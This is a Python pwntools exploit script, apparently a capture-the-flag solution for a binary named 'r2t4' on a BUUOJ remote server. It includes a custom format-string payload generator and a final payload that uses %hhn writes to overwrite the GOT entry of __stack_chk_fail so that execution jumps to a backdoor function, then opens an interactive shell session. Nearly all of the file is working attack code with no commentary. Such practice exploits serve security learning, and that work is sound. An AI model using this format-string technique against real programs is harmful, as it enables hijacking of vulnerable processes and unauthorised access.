#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'


if(sys.argv[1] =='l'):
    p = process('./r2t4')
    elf = ELF('./r2t4')
else:
    p = remote('node3.buuoj.cn',26996)
    elf = ELF('./r2t4')

def antitone_fmt_payload(offset, writes, numbwritten=0, write_size='byte'):
    config = { 
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8),
            'short': (2, 2, 0xFFFF, 'h', 16),
            'int': (1, 4, 0xFFFFFFFF, '', 32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8),
            'short': (4, 2, 0xFFFF, 'h', 16),
            'int': (2, 4, 0xFFFFFFFF, '', 32)
        }
    }

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    number, step, mask, formatz, decalage = config[context.bits][write_size]

    payload = ""

    payload_last = ""
    for where,what in writes.items():
        for i in range(0,number*step,step):
            payload_last += pack(where+i)

    fmtCount = 0
    payload_forward = ""

    key_toadd = []
    key_offset_fmtCount = []


    for where,what in writes.items():
        for i in range(0,number):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)

            if to_add != 0:
                key_toadd.append(to_add)
                payload_forward += "%{}c".format(to_add)
            else:
                key_toadd.append(to_add)
            payload_forward += "%{}${}n".format(offset + fmtCount, formatz)
            key_offset_fmtCount.append(offset + fmtCount)
            #key_formatz.append(formatz)

            numbwritten += to_add
            what >>= decalage
            fmtCount += 1


    len1 = len(payload_forward)

    key_temp = []
    for i in range(len(key_offset_fmtCount)):
        key_temp.append(key_offset_fmtCount[i])

    x_add = 0
    y_add = 0
    while True:

        x_add = len1 / 8 + 1
        y_add = 8 - (len1 % 8)

        for i in range(len(key_temp)):
            key_temp[i] = key_offset_fmtCount[i] + x_add

        payload_temp = ""
        for i in range(0,number):
            if key_toadd[i] != 0:
                payload_temp += "%{}c".format(key_toadd[i])
            payload_temp += "%{}${}n".format(key_temp[i], formatz)

        len2 = len(payload_temp)

        xchange = y_add - (len2 - len1)
        if xchange >= 0:
            payload = payload_temp + xchange*'a' + payload_last
            return payload;
        else:
            len1 = len2

backdoor = elf.symbols['backdoor']
stack = elf.got['__stack_chk_fail']


payload = "%" + str(0x6) + "c%10$hhn"
payload = payload.ljust(0x10)
payload += "%" + str(0x26 - 0x12 + 0x6) + "c%11$hhn"
payload = payload.ljust(0x20)
payload += p64(stack + 1) + p64(stack)

sd(payload)
ia()